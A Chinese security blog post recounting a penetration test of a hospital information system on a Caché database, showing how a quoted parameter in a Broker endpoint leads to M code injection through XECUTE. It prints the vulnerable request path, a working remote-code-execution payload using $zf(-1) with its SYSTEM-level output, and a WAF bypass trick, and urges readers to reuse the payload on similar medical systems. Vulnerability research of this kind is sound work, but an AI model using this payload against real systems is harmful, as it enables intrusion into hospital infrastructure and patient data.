---
title: 医疗领域的隐形门-M与Caché
url: https://mp.weixin.qq.com/s/JaADBRK0zVdixC4uqz612g
source: Doonsec's feed
date: 2026-07-02
fetch_date: 2026-07-03T05:47:01.881499
---

# 医疗领域的隐形门-M与Caché

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/jS2mB7OlsdXSUMZqGcPzVbqQpJib9SVyesEfwozIarbXAS2n2icQZ3qfNnFDicQA9ovyXTMVVlWddxdH8xRcLT6TqKGxk63cicgqVGLExcKyWao/0?wx_fmt=jpeg)

# 医疗领域的隐形门-M与Caché

原创

Sp1ke
Sp1ke

Tide安全团队

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/DuibU3GqmxVmRsdItbBVRKegNHicHQvAHDdZsGpLVU7touSU1AU1twHTfRjG3Vu5aUh0RnPPllfVUhs4qdWF5QYQ/640?wx_fmt=png)

声明：Tide安全团队原创文章，转载请声明出处！文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途给予盈利等目的，否则后果自行承担！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zYJrD2VibHmqgf4y9Bqh9nDynW5fHvgbgkSGAfRboFPuCGjVoC3qMl6wlFucsx3Y3jt4gibQgZ6LxpoozE0Tdow/640?wx_fmt=png)

0x01 前言

前段时间在做测试时遇到了一套His系统，使用的Caché作为数据库、M作为程序语言，使用AI配合对参数的挖掘，也是实现了从注入到RCE的过程；由于针对Caché/M的安全研究搜索了全网的资料发现仅有几篇、国内医疗系统提供商东华内部Caché/M的占比不低，因此分享我此次测试过程，希望能够对各位大佬做医疗领域的攻防时有些帮助。

由于时间过去很久，主页截图已经无了，分享就直接从数据包开始。原生数据包如下：

```
POST /imedical/web/csp/dhc.bdp.ext.datatrans.csp?pClassName=web.DHCBL.CT.SSUser&pClassMethod=GetTreeJson HTTP/1.1
Host:
Connection: keep-alive
Content-Length: 60
Origin:
X-Requested-With: XMLHttpRequest
User-Agent:
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer:
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8;q=0.8
Cookie:

Type=CTPCPSpecDR&hospid=2&limit=20&ParentID=TreeRoot
```

漏洞证明：

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdWzro971t5BNor2ibJbcfu2TQHobcqZNIicqN9F5zQ56WtaFmHJbQIueQ1KgvJbPfOrFnYCXhj0Onv1F8b8XP6ibowN6oicIzYeOEw/640?wx_fmt=png&from=appmsg)

0x02 初步测试

原始响应:

```
{"data":"正常数据"}
```

看到id肯定要试试注入测试。先试试一个双引号。

```
Type=CTPCPSpecDR&hospid=2"&limit=20&ParentID=TreeRoot
```

```
Error
...
Error: <b>&lt;SYNTAX&gt;zCMExecute+5^web.BDP.sys.Broker.1</b><br>
ErrorNo: <b>5002</b><br>
CSP Page: <b>/imedical/web/csp/dhc.bdp.ext.datatrans.csp</b><br>
Namespace: <b>DHC-APP</b><br>
Class: <b>web.BDP.sys.Broker</b><br>
Routine: <b>web.BDP.sys.Broker.1</b><br>
Location: <b>zCMExecute+5</b><br>
Line: <b> 	XECUTE myMethod</b><br>
```

发现这个报错，会是数据库报错吗？再试试

```
Type=CTPCPSpecDR&hospid=2""&limit=20&ParentID=TreeRoot
```

```
{"data":"正常数据"}
```

```
Type=CTPCPSpecDR&hospid=2"""&limit=20&ParentID=TreeRoot
```

```
Error
...
Error: <b>&lt;SYNTAX&gt;zCMExecute+5^web.BDP.sys.Broker.1</b><br>
ErrorNo: <b>5002</b><br>
CSP Page: <b>/imedical/web/csp/dhc.bdp.ext.datatrans.csp</b><br>
Namespace: <b>DHC-APP</b><br>
Class: <b>web.BDP.sys.Broker</b><br>
Routine: <b>web.BDP.sys.Broker.1</b><br>
Location: <b>zCMExecute+5</b><br>
Line: <b> 	XECUTE myMethod</b><br>
```

```
Type=CTPCPSpecDR&hospid=2""""&limit=20&ParentID=TreeRoot
```

```
{"data":"正常数据"}
```

嗯？难道是SQL注入？那我岂不是

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdU5NUfQCIQ07fj4QkcfsrlTFshxfboReHjSDg0BEsrOFVAt7AV9A623AqdVU38FOTDic3GFicSC6RQMwamXVevjibZpow6C1pd2MA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdVrEmyeTibPt4flcw2n8jLfph9ja1MIt7fyXgVoVxkMeBeEELO5vE1FtY7dBvOavDfaicrvlIiaia6smDIibicrrnBItrE8z92NBZXqk/640?wx_fmt=png&from=appmsg)

然而现实给我我迎头重击，sqlmap无论换什么姿势都跑不出，回头一看sqlmap不支持Caché，，，手注也没有办法，回到报错仔细研究了下。看到报错里有关键字，`Line: <b> XECUTE myMethod</b><br>`，上网搜索了一下`XECUTE`,确定为Caché数据库，那么问题出在哪了。难道是下图里的"M"程序的问题？

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdWP9ibic2RDOwzibbnvEZChz1ibdXKg0BV0zFKmosynYRphggicHz7bfY1soFSoWMicdNRemxqnndRFdeSu3DHDugRIZU0GNulXWnRrc/640?wx_fmt=png&from=appmsg)

0x03 MUMPS语言和Caché

看了不得不了解一下M语言了。

在程序语言领域，从我们这一代作为初学者时开始，语言和数据库，好像从来都是分离的。最多就是一些语言和数据库的强关联，例如Java和Oracle，.NET和Sqlserver等等。Mysql诞生于1995年，Oracle诞生于1970，Sqlserver诞生于1980年左右。然而在20世纪60年代，有这么一群不堪忍受病房病例和病人信息记录效率底下的程序员，开发出了数据库和语言为一体的语言--M语言。M语言诞生后因为其高性能的特性，迅速风靡了整个医疗领域，在国内外都有它的身影。1997年，InterSystems公司基于M语言推出了M语言编写的数据库--Caché。为Caché数据库添加了面向对象、SQL支持和高性能缓存技术。由于垂直领域的特性和性能原因，直到今天，Caché在国内外医疗领域依然占有相当大的份额。

0x04 极速与极简-“精打细算”的语言

以Python为对照，M语言的许多值均可进行缩写，例如SET可以缩写为S等等，常见语法和缩写参见下表。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jS2mB7OlsdUtC7ZOr6X0Kg4nnVQmQB0kq9yQpZaR5HiaWIdjViazKk2ohYEC4GYrFWG5KlVouoFeAw4HheeGbyFxibs3u77gL54SHNgMf2kG0o/640?wx_fmt=png&from=appmsg)

了解了部分M语言语法后，下一步需要了解关于受测系统的设计模式怎样的。

0x05 万能插口-Broker架构的短板

在报错中，我注意到一个频繁出现的关键词Broker

```
Error
...
Error: <b>&lt;SYNTAX&gt;zCMExecute+5^web.BDP.sys.Broker.1</b><br>
ErrorNo: <b>5002</b><br>
CSP Page: <b>/imedical/web/csp/dhc.bdp.ext.datatrans.csp</b><br>
Namespace: <b>DHC-APP</b><br>
Class: <b>web.BDP.sys.Broker</b><br>
Routine: <b>web.BDP.sys.Broker.1</b><br>
Location: <b>zCMExecute+5</b><br>
Line: <b> 	XECUTE myMethod</b><br>
```

如果你用过插座，你就能理解Borker。插座不关心插头连接的是什么电器，插座只需要提供电流就可以。类比到编程里，前端的请求在后端，只需要前端请求里携带好类名，方法名，参数，直接去后端找相关的业务逻辑。在M语言的设计里，这个过程更加便捷，通过上表清楚XECUTE可以直接将字符串当作代码运行，只需要用以下代码，就可以实现一个前后端之间的"插座"。

```
XECUTE"d ##class("_pClassName_")."_pClassMethod_"(args)"
```

而在传统的MVC架构中，这个过程可能需要Controller，路由映射来协助完成。

```
@("/GetPatient")
method1
@("/DeletePatient")
method2
...
```

相当于将Java反射从后端搬到了前端来，省去了配置路由等等的工作过程，为开发省去了代码量。而眼下这套医疗系统，貌似使用了同样的手法；那么，代价是什么呢？ 分析系统环境请教AI大人后，得到后端的代码可能如下:

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdUJC3yMicDNsSzViaNXOpXtlnFPylMvP1OE4xujIumDThWibotO7P1mIOiarZW6vPsbMAt80NDicqiaJruHt3UicGnXuhtTm3CTWVjso0/640?wx_fmt=png&from=appmsg)

有这么一群神通广大的贵Coder，没有做插座的任何“断电保护”，导致房间失火。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jS2mB7OlsdVniae6UT8Vq12leIMjv7aYYLeoYJkTCjKZdu3cqdyr5CLbnZu9mwcOp262IaJmFWaB5xsXACfDiaXibTnbfszibPibdLkgI3KGHAic4/640?wx_fmt=png&from=appmsg)

测试发现系统在进入函数调用、数据查询前，对用户输入没有任何过滤，当hospid等于`");s a="(`，返回的响应是正常数据。

这个时候对应位置的代码就变成了:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jS2mB7OlsdUKBbaibicx1Lbic3ZpgrIic27xsBw7V83DXn1Qzstq5qM14OXuEoTYq7xum3vJg6T7S6gT9Ak9ARKxXuhV1zJ3dGOlrH9N03Ufibsw/640?wx_fmt=png&from=appmsg)

在`s　myMethod　=　"d　##class("_pClassName_")."_pClassMethod_"("_type_","");`和`s a =("")"`之间，为我们留下了代码注入空间，这时候只需要使用以上表格的对应M代码来完成注入即可。

Payload即`")　s　f="tmp.txt"　d　$zf(-1,"whoami　>　"_f) s t=##class(%Stream.FileCharacter).%New()　d　t.LinkToFile(f) w "Result:[",t.Read(),"]" d t.%Close() n o s o=##class(%File).Delete(f) s a=("`

进行拆解:

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdUmwgXWIjdIMhpq9HZ5gnUZmSRjkwf0z9gOvvEcovUlQdhYqQZvZtJPiaNNbWwfIhDBcgYICOUfNnJCrMMNGNkicMc8KQ9QUPEYc/640?wx_fmt=png&from=appmsg)

获得响应

```
HTTP/1.1 200 OK

Result:[nt authority\system
]{data:{正常数据}
```

0x06 薛定谔的注入-从SQL注入到代码注入的判断

在我此前的经验中，对于一般参数的sql注入判断也是通过逐次+1输入双引号/单引号来做的，这次误打误撞实现了代码注入，其实有很大运气成分；问了AI，在M语言中，想要在字符串中表示一个双引号，需要用另一个双引号来转义，这就成为了和我的经验同样的效果。为了便于理解，接下来被转义的双引号我使用\"来表示

当我输入`2"`时，`s　myMethod　=　"d　##class("_pClassName_")."_pClassMethod_"("_type_","2"")"`,语句中原本用于闭合用户输入的右双引号，被用户输入的双引号转义为了一个字符串中的双引号。这里的字符串就变成了`2"`,而XEXCUTE执行时的语句就变成了`d　##class("_pClassName_")."_pClassMethod_"("_type_","2\")`，能发现后面还缺一个引号闭合语句，导致了报错

所以当我输入`2""`，`"d　##class("_pClassName_")."_pClassMethod_"("_type_","2""")"`,XEXCUTE执行时的语句就变成了`d　##class("_pClassName_")."_pClassMethod_"("_type_","2\"")`,后面同样存在一个引号闭合语句，编译通过。因此造成了SQL注入的错觉。

0x07 常见利用

当小伙伴们在医疗系统（尤其是东华）测试遇到引号闭合但是sql注入换多个payload，sqlmap跑不出结果时，不妨试试M代码注入。

在遇到类似的回显报错时，可以直接使用我的payload尝试。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jS2mB7OlsdWCMgdcQicibdxSHxU4yXVDcx3A4g5csLlLzrRDSA7t6EXBSSJfzzT2ZRt6vtDBMVQPvp5Askias0Txu5Hcalpt1ASWtMYUAK2eRo/640?wx_fmt=png&from=appmsg)

无回显出网时，可以使用以下Payload进行测试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jS2mB7OlsdX23AsGvWLrcWFVd5kqoicS58PW8aFWeJ0icrcJqCknQmVo5MMZFiceibUp6VL6o36YwZReVMbUXBYShbWX1IG8boB64ttNM32Kr1A/640?wx_fmt=png&from=appmsg)

利用M语言来进行文件读取

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdWUWJxpeuFrU4DrQtM8bzuCdibMwYibOaCK4WXRCmNhy1qvn1VurmJiclG0cCq2AJWjEKe7qB4J5mPrQfQHK4SZVCELJmWODd5Fog/640?wx_fmt=png&from=appmsg)

数据库操作

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jS2mB7OlsdVH5UqcXl4naxBjibx9vXB9fTWibLa1BYXsZ3e95BgWrjGBotMiaLicDibbgZDkkRdDibCQAx1kZ8jdOa4R7NyjGykEeHDbWjEw0s3wk/640?wx_fmt=png&from=appmsg)

WAF绕过可用到的特性

Caché所使用的连接符:`_` 从ASCII码获取字符函数: `$c()`

例如SET关键词被过滤，就可以用`$c(83)_$c(101)_$c(116)`代替。

今天关于Caché的分享就到这里了。

![](https://mmbiz.qpic.cn/mmbiz_png/jS2mB7OlsdVXBjjn4icxBPyOLLib4QGia0BxE7paiacCstDt8yNJODY07xHpLDFHO6NA1iaZZh9on0nSH3WDr59H6AmNcyDQiabcY09Fytv6Npxf8/640?wx_fmt=png&from=appmsg)

0x08 参考链接

[https://mp.weixin.qq.com/s/8W4gNjDbdB0GnWE4QNzIQQ](https://mp.weixin.qq.com/s?__biz=Mzg2MjA1NTA5Ng==&mid=2247488079&...